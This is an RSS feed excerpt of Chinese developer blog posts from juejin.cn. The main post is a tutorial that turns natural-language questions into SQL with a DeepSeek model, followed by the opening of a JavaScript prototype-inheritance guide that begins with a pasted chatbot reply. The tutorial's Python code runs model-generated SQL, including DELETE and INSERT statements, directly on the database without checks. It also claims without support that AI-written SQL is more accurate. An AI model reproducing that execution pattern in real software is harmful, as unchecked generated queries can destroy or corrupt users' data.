<p>这种设计模式使得组件具有良好的可复用性和可扩展性，能够快速适配不同的业务需求，是一个可靠的移动端公共选人/选部门组件解决方案。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI TO SQL：AIGC时代数据库操作的革命性变革]]></title>    <link>https://juejin.cn/post/7579843977847799862</link>    <guid>https://juejin.cn/post/7579843977847799862</guid>    <pubDate>2025-12-04T15:51:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579843977847799862" data-draft-id="7579659550863048746" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI TO SQL：AIGC时代数据库操作的革命性变革"/> <meta itemprop="keywords" content="LLM,数据库,AIGC"/> <meta itemprop="datePublished" content="2025-12-04T15:51:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="晴栀ay"/> <meta itemprop="url" content="https://juejin.cn/user/402859727269579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI TO SQL：AIGC时代数据库操作的革命性变革
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/402859727269579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    晴栀ay
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T15:51:58.000Z" title="Thu Dec 04 2025 15:51:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    13
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">AI TO SQL：AIGC时代数据库操作的革命性变革</h2>
<p><strong>引言：从Mobile First到AI First</strong></p>
<p>在移动互联网时代，我们习惯了"Mobile First"的设计思维。然而，随着大语言模型（LLM）的飞速发展，我们正迎来一个全新的时代——<strong>AI First</strong>。在这个时代，AI不再是辅助工具，而是核心驱动力。而数据库操作的革命性变化——AI TO SQL（AI to SQL），正是这一变革的生动体现。</p>
<p>最近，随着豆包手机、Gemini等AI助手的普及，以及"vibe coding"理念的流行，自然语言生成SQL查询正从概念走向现实，成为开发者和业务人员的日常工具。今天，我将带大家深入探讨这一前沿技术，并通过一个实战案例，展示如何将自然语言查询转换为SQL语句。</p>
<h3 data-id="heading-1">什么是AI TO SQL？</h3>
<p>AI TO SQL是将自然语言转换为SQL查询的技术，它让非技术背景的用户也能通过简单的自然语言描述来获取数据库中的数据。无需掌握SQL语法，只需用日常语言描述需求，AI就能生成正确的SQL查询语句。</p>
<p>这与传统的数据库操作方式截然不同。过去，开发人员需要花费大量时间学习SQL语法，编写复杂的查询语句；而现在，通过AI TO SQL，即使是业务人员也能直接与数据库交互，大大提高了数据获取的效率。</p>
<h3 data-id="heading-2">技术原理：LLM如何理解数据库</h3>
<p>AI TO SQL的核心在于大语言模型（LLM）对数据库schema和自然语言的理解能力：</p>
<ol>
<li><strong>Schema理解</strong>：LLM需要理解数据库的表结构、字段含义和关系</li>
<li><strong>自然语言处理</strong>：将用户的自然语言查询转换为精确的SQL语义</li>
<li><strong>SQL生成</strong>：生成符合数据库语法的SQL查询语句</li>
</ol>
<p>在实际应用中，我们需要提供给LLM关键上下文：</p>
<ul>
<li>数据库的schema（表结构）</li>
<li>用户的自然语言查询</li>
<li>限制条件（如"只输出SQL，不要其他内容"）</li>
</ul>
<h3 data-id="heading-3">实战案例：从自然语言到SQL的完整流程</h3>
<p>让我们通过一段代码，深入了解AI TO SQL的实现细节。</p>
<h4 data-id="heading-4">1. 设置轻量级数据库</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> sqlite3

<span class="hljs-comment"># 创建SQLite连接</span>
conn = sqlite3.connect(<span class="hljs-string">"test.db"</span>)
cursor = conn.cursor()

<span class="hljs-comment"># 创建employees表</span>
cursor.execute(<span class="hljs-string">"""
CREATE TABLE IF NOT EXISTS employees(
    id INTEGER PRIMARY KEY,
    name TEXT,
    department TEXT,
    salary INTEGER
)
"""</span>)
</code></pre>
<p><strong>为什么选择SQLite？</strong></p>
<ul>
<li>轻量级：无需服务器，直接存储在文件中</li>
<li>本地化：适合移动端和桌面应用（如微信中的本地数据库）</li>
<li>简单易用：API简单，适合快速原型开发</li>
<li>无需安装：相比MySQL等需要单独安装的数据库，SQLite更方便</li>
</ul>
<h4 data-id="heading-5">2. 插入测试数据</h4>
<pre><code class="hljs language-python" lang="python">sample_data = [
    (<span class="hljs-number">6</span>, <span class="hljs-string">"张三"</span>, <span class="hljs-string">"技术部"</span>, <span class="hljs-number">6</span>),
    (<span class="hljs-number">7</span>, <span class="hljs-string">"李四"</span>, <span class="hljs-string">"销售部"</span>, <span class="hljs-number">30</span>),
    (<span class="hljs-number">8</span>, <span class="hljs-string">"王五"</span>, <span class="hljs-string">"开发部"</span>, <span class="hljs-number">68</span>),
]
cursor.executemany(<span class="hljs-string">'INSERT INTO employees VALUES(?,?,?,?)'</span>, sample_data)
conn.commit()
</code></pre>
<p>这一步创建了示例数据，用于后续查询测试。</p>
<h4 data-id="heading-6">3. 获取数据库Schema</h4>
<pre><code class="hljs language-python" lang="python">schema = cursor.execute(<span class="hljs-string">"PRAGMA table_info(employees)"</span>).fetchall()
schema_str = <span class="hljs-string">"CREATE TABLE EMPLOYEES (\n"</span> + <span class="hljs-string">"\n"</span>.join([<span class="hljs-string">f"<span class="hljs-subst">{col[<span class="hljs-number">1</span>]}</span> <span class="hljs-subst">{col[<span class="hljs-number">2</span>]}</span>"</span> <span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> schema]) + <span class="hljs-string">"\n)"</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"数据库Schema:"</span>)
<span class="hljs-built_in">print</span>(schema_str)
</code></pre>
<p><strong>为什么需要Schema？</strong></p>
<ul>
<li>LLM需要了解数据库的结构才能生成正确的SQL</li>
<li><code>PRAGMA table_info</code>是SQLite特有的命令，用于获取表结构信息</li>
<li>生成的schema字符串是LLM理解数据库的关键上下文</li>
</ul>
<p>输出示例：</p>
<pre><code class="hljs language-text" lang="text">数据库Schema:
CREATE TABLE EMPLOYEES (
id INTEGER
name TEXT
department TEXT
salary INTEGER
)
</code></pre>
<h4 data-id="heading-7">4. LLM生成SQL查询</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ask_deepseek</span>(<span class="hljs-params">query, schema</span>):
    prompt = <span class="hljs-string">f"""
    这是一个数据库的Schema:
    <span class="hljs-subst">{schema}</span>
    根据这个Schema,你能输出一个SQL查询来回答以下问题吗？
    只输出SQL查询,不要输出任何其他内容，也不要带任何格式。
    问题：<span class="hljs-subst">{query}</span>
    """</span>
    response = client.chat.completions.create(
        model=<span class="hljs-string">"deepseek-reasoner"</span>,
        max_tokens=<span class="hljs-number">2048</span>,
        messages=[{
            <span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>,
            <span class="hljs-string">"content"</span>: prompt
        }]
    )
    <span class="hljs-keyword">return</span> response.choices[<span class="hljs-number">0</span>].message

question = <span class="hljs-string">"开发部部门员工的姓名和工资是多少？"</span>
sql = ask_deepseek(question, schema_str)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"生成的sql查询："</span>)
<span class="hljs-built_in">print</span>(sql)
</code></pre>
<p><strong>关键点解析：</strong></p>
<ol>
<li><strong>Prompt设计</strong>：这是AI TO SQL成功的关键。我们提供了完整的数据库schema，并明确指示只输出SQL，避免LLM添加额外内容。</li>
<li><strong>模型选择</strong>：使用<code>deepseek-reasoner</code>模型，这是一个专门优化推理能力的模型。</li>
<li><strong>输出控制</strong>：通过明确的指令"只输出SQL查询"，确保LLM生成的输出是纯SQL，便于程序解析。</li>
</ol>
<p>输出示例：</p>
<pre><code class="hljs language-text" lang="text">生成的sql查询：
ChatCompletionMessage(content="```sql\nSELECT name, salary FROM EMPLOYEES WHERE department = '开发部';\n```", refusal=None, role='assistant', ...)
</code></pre>
<h4 data-id="heading-8">5. 执行生成的SQL</h4>
<pre><code class="hljs language-python" lang="python">cursor.execute(sql.content)
results = cursor.fetchall()
<span class="hljs-built_in">print</span>(results)
</code></pre>
<p>这一步执行生成的SQL查询，并打印结果。</p>
<p><strong>附：代码测试</strong></p>
<pre><code class="hljs language-ini" lang="ini">from openai import OpenAI
<span class="hljs-comment"># openai sdk llm 接口标准 completeion chat</span>
<span class="hljs-attr">client</span> = OpenAI(
    <span class="hljs-attr">api_key</span> = <span class="hljs-string">'这里填你自己的API key'</span>,
    <span class="hljs-attr">base_url</span> = <span class="hljs-string">'https://api.deepseek.com/v1'</span>
)

import sqlite3
<span class="hljs-comment"># 连接数据库</span>
<span class="hljs-attr">conn</span> = sqlite3.connect(<span class="hljs-string">"test.db"</span>)
<span class="hljs-comment"># 创建一个游标对象</span>
<span class="hljs-comment"># 用于执行sql 获取查询结果</span>
<span class="hljs-attr">cursor</span> = conn.cursor()
<span class="hljs-comment"># 员工表</span>
cursor.execute("""
CREATE TABLE IF NOT EXISTS employees(
    id INTEGER PRIMARY KEY,
    name TEXT,
    department TEXT,
    salary INTEGER
)
""")

<span class="hljs-attr">sample_data</span> = [ 
    <span class="hljs-comment"># 元组类型 有顺序的  tuple </span>
    (<span class="hljs-number">6</span>, <span class="hljs-string">"黄佳"</span>, <span class="hljs-string">"销售"</span>, <span class="hljs-number">50000</span>), 
    (<span class="hljs-number">7</span>, <span class="hljs-string">"宁宁"</span>, <span class="hljs-string">"工程"</span>, <span class="hljs-number">75000</span>), 
    (<span class="hljs-number">8</span>, <span class="hljs-string">"谦谦"</span>, <span class="hljs-string">"销售"</span>, <span class="hljs-number">60000</span>), 
    (<span class="hljs-number">9</span>, <span class="hljs-string">"悦悦"</span>, <span class="hljs-string">"工程"</span>, <span class="hljs-number">80000</span>), 
    (<span class="hljs-number">10</span>, <span class="hljs-string">"黄仁勋"</span>, <span class="hljs-string">"市场"</span>, <span class="hljs-number">55000</span>),
    (<span class="hljs-number">11</span>, <span class="hljs-string">"曾繁花"</span>, <span class="hljs-string">"工程"</span>, <span class="hljs-number">80000</span>)
]

<span class="hljs-comment"># 插入sql</span>
cursor.executemany(
    "INSERT INTO employees VALUES(?,?,?,?)",
    sample_data
)

<span class="hljs-comment"># 提交sql事务</span>
conn.commit()

<span class="hljs-attr">schema</span> = cursor.execute(<span class="hljs-string">"PRAGMA table_info(employees)"</span>).fetchall()
print(schema)
<span class="hljs-comment"># 列表推导式</span>
<span class="hljs-attr">schema_str</span> = <span class="hljs-string">"CREATE TABLE EMPLOYEES (\n"</span> + <span class="hljs-string">"\n"</span>.join([f<span class="hljs-string">"{col[1]} {col[2]}"</span> for col in schema]) + <span class="hljs-string">"\n)"</span>
print(schema_str)

def ask_deepseek(query, schema):
    <span class="hljs-attr">prompt</span> = f<span class="hljs-string">"""
    这是一个数据库的Schema:
    {schema}
    根据这个Schema,请输出一个SQL查询来回答以下问题。
    只输出SQL查询语句本身，不要使用任何Markdown格式，
    不要包含反引号、代码块标记或额外说明。
    问题：{query}
    """</span>
    print(prompt)
    <span class="hljs-attr">response</span> = client.chat.completions.create(
        <span class="hljs-attr">model</span>=<span class="hljs-string">"deepseek-chat"</span>,
        <span class="hljs-attr">max_tokens</span>=<span class="hljs-number">2048</span>,
        <span class="hljs-attr">messages</span>=[{
            <span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>,
            <span class="hljs-string">"content"</span>: prompt
        }],
        <span class="hljs-attr">temperature</span>=<span class="hljs-number">0</span>
    )
    return response.choices<span class="hljs-section">[0]</span>.message.content
    
<span class="hljs-attr">question</span> = <span class="hljs-string">"工程部门员工的姓名和工资是多少"</span>
<span class="hljs-attr">sql_query</span> = ask_deepseek(question,schema_str)
print(sql_query)

<span class="hljs-attr">results</span> = cursor.execute(sql_query).fetchall()
print(results)

<span class="hljs-attr">question</span> = <span class="hljs-string">"在销售部门增加一个新员工，姓名为张三，工资为45000"</span>
<span class="hljs-attr">sql_query</span> = ask_deepseek(question,schema_str)
print(sql_query)
cursor.execute(sql_query)
conn.commit()

<span class="hljs-attr">question</span> = <span class="hljs-string">"删除市场部门的黄仁勋"</span>
<span class="hljs-attr">sql_query</span> = ask_deepseek(question, schema_str)
print(sql_query)
cursor.execute(sql_query)
conn.commit()

<span class="hljs-attr">question</span> = <span class="hljs-string">"查询所有员工的信息"</span>
<span class="hljs-attr">sql_query</span> = ask_deepseek(question, schema_str)
print(sql_query)
<span class="hljs-attr">results</span> = cursor.execute(sql_query).fetchall()
print(results)
</code></pre>
<p>快去试试吧！</p>
<hr/>
<h3 data-id="heading-9">AI TO SQL的优势与价值</h3>
<ol>
<li><strong>降低技术门槛</strong>：业务人员无需学习SQL，直接用自然语言获取数据</li>
<li><strong>提高开发效率</strong>：开发者可以专注于业务逻辑，而非SQL语法</li>
<li><strong>减少错误</strong>：AI生成的SQL更准确，减少了人为错误</li>
<li><strong>加速迭代</strong>：快速响应业务需求，无需反复调整SQL语句</li>
</ol>
<p>sql也是文本，只不过它是数据库的专业语言，AIGC再擅长不过</p>
<h3 data-id="heading-10">为什么是SQLite而非MySQL？</h3>
<p>SQLite特别适合AI TO SQL场景的原因：</p>
<ul>
<li><strong>轻量级</strong>：不需要单独的数据库服务器</li>
<li><strong>嵌入式</strong>：可以直接集成到应用中</li>
<li><strong>文件存储</strong>：数据存储在本地文件，便于管理和备份</li>
<li><strong>零配置</strong>：无需设置用户、密码等</li>
<li><strong>适合移动端</strong>：微信等应用中广泛使用SQLite作为本地数据库</li>
</ul>
<p>相比之下，MySQL需要额外的服务器配置和管理，不适合这种轻量级、本地化的AI TO SQL场景。</p>
<h3 data-id="heading-11">未来展望</h3>
<p>AI TO SQL正在快速发展，未来可能有以下趋势：</p>
<ol>
<li><strong>更智能的上下文理解</strong>：LLM将更好地理解复杂的业务逻辑和数据关系</li>
<li><strong>多数据库支持</strong>：不仅支持SQLite，还能处理MySQL、PostgreSQL等主流数据库</li>
<li><strong>实时反馈与修正</strong>：用户可以对生成的SQL进行反馈，让AI持续优化</li>
<li><strong>与BI工具集成</strong>：与Tableau、Power BI等商业智能工具无缝集成</li>
<li><strong>企业级安全增强</strong>：确保生成的SQL符合企业安全策略</li>
</ol>
<h3 data-id="heading-12">结语</h3>
<p>从Mobile First到AI First，我们正见证着技术范式的转变。AI TO SQL作为这一转变的代表，正在改变我们与数据库交互的方式。通过将自然语言转换为SQL，我们不仅降低了技术门槛，还大大提高了数据获取的效率。</p>
<p>正如我们从`中看到的，实现AI TO SQL并不复杂，只需要合适的工具和精心设计的prompt。在AIGC时代，掌握这一技能，将使我们成为更具竞争力的开发者。</p>
<p><strong>"当SQL不再是障碍，数据才是真正的资产。"</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript 面向对象编程：从构造函数到原型继承的完整指南]]></title>    <link>https://juejin.cn/post/7579813925995937833</link>    <guid>https://juejin.cn/post/7579813925995937833</guid>    <pubDate>2025-12-04T11:39:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579813925995937833" data-draft-id="7579659550862573610" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" JavaScript 面向对象编程：从构造函数到原型继承的完整指南"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2025-12-04T11:39:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="想要成为糕糕手"/> <meta itemprop="url" content="https://juejin.cn/user/4381975238424308"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             JavaScript 面向对象编程：从构造函数到原型继承的完整指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4381975238424308/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    想要成为糕糕手
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T11:39:58.000Z" title="Thu Dec 04 2025 11:39:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>当然可以！你提供的文章已经非常系统、清晰地讲解了 JavaScript 面向对象的核心机制。为了进一步<strong>完善内容</strong>，我们将把上一个对话中关于 <code>Animal.apply(this)</code> 的详细解析<strong>有机融入</strong>到“第五部分：继承”中，并补充一些关键细节（如传参、组合继承的局限性、现代替代方案等），使整篇文章逻辑更严密、教学更完整。</p>
<hr/>
<h2 data-id="heading-0">JavaScript 面向对象编程：从构造函数到原型继承的完整指南</h2>
<blockquote>
<p>本文将带你深入理解 JavaScript 中面向对象（OOP）的核心机制 —— 构造函数、原型（prototype）、继承，以及 ES6 的 class 语法糖背后的真相。</p>
</blockquote>
<p>JavaScript 是一门<strong>基于对象</strong>的语言，但它的 OOP 实现方式与其他主流语言（如 Java、C++）截然不同。它没有传统意义上的“类”，而是通过**原型链（Prototype Chain）**实现对象之间的继承与共享。</p>
<p>即使在 ES6 引入了 <code>class</code> 关键字后，其底层依然是基于原型的。因此，要真正掌握 JS 的面向对象，必须理解 <strong>构造函数 + 原型</strong> 这一核心模型。</p>
<hr/>
<h3 data-id="heading-1">一、原始模式：对象字面量的局限</h3>
<p>最简单的创建对象方式：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> cat1 = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'加菲猫'</span>,
  <span class="hljs-attr">color</span>: <span class="hljs-string">'橘色'</span>
};
<span class="hljs-keyword">var</span> cat2 = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'黑猫警长'</span>,
  <span class="hljs-attr">color</span>: <span class="hljs-string">'黑色'</span>
};
</code></pre>
<p>这种方式虽然直观，但存在明显问题：</p>
<ul>
